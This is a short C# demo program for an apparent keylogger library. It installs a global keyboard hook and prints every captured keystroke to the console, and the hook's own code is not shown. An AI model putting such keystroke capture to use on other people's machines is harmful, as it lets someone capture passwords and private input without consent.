using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading.Tasks;

namespace Keylogger.Demo
{
    class Program
    {
        static void Main(string[] args)
        {
            using (var api = new API.KeyLogger())
            {
                api.CreateKeyboardHook((character) => { Console.Write(character); });
                Application.Run();
            }
        }
    }
}
